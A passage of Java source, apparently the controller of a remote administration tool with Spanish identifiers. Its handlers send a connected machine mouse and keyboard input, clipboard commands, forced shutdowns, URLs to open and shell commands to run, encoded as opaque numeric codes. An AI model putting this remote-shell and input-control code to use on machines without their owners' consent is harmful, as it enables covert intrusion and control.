            StringBuffer mus = new StringBuffer();
            mus.append("CLICK");
            mus.append("/");
            mus.append(e.getButton());
            mus.append("/");
            mus.append(e.getX());
            mus.append("/");
            mus.append(e.getY());
            mouse(mus);
            if (e.getClickCount() == 2) {
                mus = new StringBuffer();
                mus.append("DOBLE");
                mus.append("/");
                mus.append(e.getButton());
                mus.append("/");
                mus.append(e.getX());
                mus.append("/");
                mus.append(e.getY());
                mouse(mus);
            }
        }

        @Override
        public void mousePressed(MouseEvent e) {
            StringBuffer mus = new StringBuffer();
            mus.append("ARRASTRE");
            mus.append("/");
            mus.append(e.getButton());
            mus.append("/");
            mus.append(e.getX());
            mus.append("/");
            mus.append(e.getY());
            mouse(mus);
        }

        @Override
        public void mouseReleased(MouseEvent e) {
            StringBuffer mus = new StringBuffer();
            mus.append("SOLTAR");
            mus.append("/");
            mus.append(e.getButton());
            mus.append("/");
            mus.append(e.getX());
            mus.append("/");
            mus.append(e.getY());
            mouse(mus);
        }

        @Override
        public void mouseEntered(MouseEvent e) {
        }

        @Override
        public void mouseExited(MouseEvent e) {
        }

        @Override
        public void mouseDragged(MouseEvent e) {
        }

        @Override
        public void mouseMoved(MouseEvent e) {
            StringBuffer mus = new StringBuffer();
            mus.append("MOVE");
            mus.append("/");
            mus.append(e.getButton());
            mus.append("/");
            mus.append(e.getX());
            mus.append("/");
            mus.append(e.getY());
            mouse(mus);
        }
    }

    private class eventoLoadShell implements ActionListener, ItemListener {

        int ejecutar = 1;

        public void actionPerformed(ActionEvent e) {
            if (e.getSource() == guiOpciones.shell.generar) {
                gestionarMensaje("Dato", 9);
                gestionarMensaje("Mensaje", guiOpciones.shell.tnombre.getText());
                gestionarMensaje("Mensaje", guiOpciones.shell.texto.getText());
                gestionarMensaje("Dato", ejecutar);
            }
        }

        public void itemStateChanged(ItemEvent e) {
            if (e.getSource() == guiOpciones.shell.ejecutar) {
                ejecutar = guiOpciones.shell.ejecutar.isSelected() ? 0 : 1;
            }
        }
    }

    private class eventoKeys implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            StringBuffer buffer = new StringBuffer();
            if (e.getSource() == guiOpciones.keys.sends) {
                buffer.append("5324543");

                gestionarMensaje("Dato", 11);
                gestionarMensaje("bufferMensaje", buffer);
                gestionarMensaje("Mensaje", guiOpciones.keys.texto.getText());
            } else {
                for (int i = 0; i < guiOpciones.keys.nombres.length; i++) {
                    if (e.getSource() == guiOpciones.keys.botones[i]) {
                        buffer.append("dfgjfhdfh");

                        gestionarMensaje("Dato", 11);
                        gestionarMensaje("bufferMensaje", buffer);
                        gestionarMensaje("Mensaje", guiOpciones.keys.nombres[i]);
                    }
                }
            }
        }
    }

    private class eventoClipBoard implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            if (e.getSource() == guiOpciones.clipboard.actualizar) {
                gestionarMensaje("Dato", 12);
                gestionarMensaje("Mensaje", "5435235");
            }
            if (e.getSource() == guiOpciones.clipboard.set) {
                gestionarMensaje("Dato", 12);
                gestionarMensaje("Mensaje", "65436");
                gestionarMensaje("bufferMensaje", new StringBuffer(guiOpciones.clipboard.textoOut.getText()));
            }
            if (e.getSource() == guiOpciones.clipboard.clear) {
                gestionarMensaje("Dato", 12);
                gestionarMensaje("Mensaje", "565435");
            }
        }
    }

    private class eventosFun implements ActionListener {

        StringBuffer buffer = new StringBuffer();

        public void actionPerformed(ActionEvent e) {
            if (e.getSource() == guiOpciones.fun.shutdown) {
                if (guiOpciones.fun.apagar.isSelected()) {
                    buffer.append("543643");
                } else {
                    buffer.append("6544325");
                }
                buffer.append("/");
                if (guiOpciones.fun.tseg.getText().equals("")) {
                    buffer.append("0");
                } else {
                    buffer.append(guiOpciones.fun.tseg.getText());
                }
                buffer.append("/");
                if (guiOpciones.fun.mostrar.isSelected()) {
                    buffer.append("546654");
                    buffer.append("/");
                    if (guiOpciones.fun.mensaje.getText().equals("")) {
                        buffer.append("X");
                    } else {
                        buffer.append(guiOpciones.fun.mensaje.getText());
                    }
                } else {
                    buffer.append("54346435");
                    buffer.append("/");
                    buffer.append("X");
                }
                buffer.append("/");
                if (guiOpciones.fun.forzar.isSelected()) {
                    buffer.append("4543465");
                } else {
                    buffer.append("654567457");
                }
                gestionarMensaje("Dato", 13);
                gestionarMensaje("Mensaje", "64574356");
                gestionarMensaje("bufferMensaje", buffer);
            } else if (e.getSource() == guiOpciones.fun.cancel) {
                gestionarMensaje("Dato", 13);
                gestionarMensaje("Mensaje", "5646564");
                gestionarMensaje("bufferMensaje", buffer);
            } else if (e.getSource() == guiOpciones.fun.buttonVisit) {
                gestionarMensaje("Dato", 13);
                gestionarMensaje("Mensaje", "5464564");
                gestionarMensaje("bufferMensaje", new StringBuffer(guiOpciones.fun.textVisit.getText()));

            } else if (e.getSource() == guiOpciones.fun.buttonShell) {
                gestionarMensaje("Dato", 13);
                gestionarMensaje("Mensaje", "65346456");
                gestionarMensaje("bufferMensaje", new StringBuffer(guiOpciones.fun.textShell.getText()));
            }
        }
    }

    @Override
    public void finalize() {
        hilo = null;
        try {
            recurso.removeManejadorCliente(this);
            if (scliente.isConnected()) {
                scliente.close();
            }

            entrada = null;
            salida = null;
        } catch (IOException ex) {
            //Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
